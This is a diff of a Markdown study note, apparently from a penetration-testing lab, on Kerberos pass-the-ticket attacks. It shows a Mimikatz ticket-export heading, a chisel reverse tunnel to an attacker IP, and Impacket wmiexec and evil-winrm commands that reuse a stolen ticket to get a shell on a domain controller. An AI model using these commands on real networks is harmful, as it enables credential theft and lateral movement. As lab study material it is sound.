@@ -6,7 +6,7 @@ The Kerberos authentication system is ticket-based.
 
 If the user wants to connect to an MSSQL database, it will request a Ticket Granting Service (TGS) to The Key Distribution Center (KDC), presenting its Ticket Granting Ticket (TGT). Then it will give the TGS to the MSSQL database server for authentication
 # Attack
-Tickets are processed and stored by the #LSASS
+Tickets are processed and stored by the [[LSASS]]
 As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.
 #### #Mimikatz - export tickets
 ```cmd
@@ -243,7 +243,7 @@ c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
 2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
 ```
 Finally, we need to transfer Julio's ccache file from LINUX01 and create the environment variable KRB5CCNAME with the value corresponding to the path of the ccache file.
-## Impacket with proxychain ans kerberos
+## #Impacket with proxychain ans kerberos
 ```bash
 proxychains impacket-wmiexec dc01 -k
 
@@ -264,7 +264,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 C:\>whoami
 inlanefreight\julio
 ```
-## evil-winrm
+## #evil-winrm
 ```bash
 sudo apt-get install krb5-user -y
 
@@ -290,7 +290,7 @@ cat /etc/krb5.conf
 
 <SNIP>
 ```
-## Using Evil-WinRM with Kerberos
+## Using #evil-winrm  with Kerberos
 ```bash
 proxychains evil-winrm -i dc01 -r inlanefreight.htb
 ...
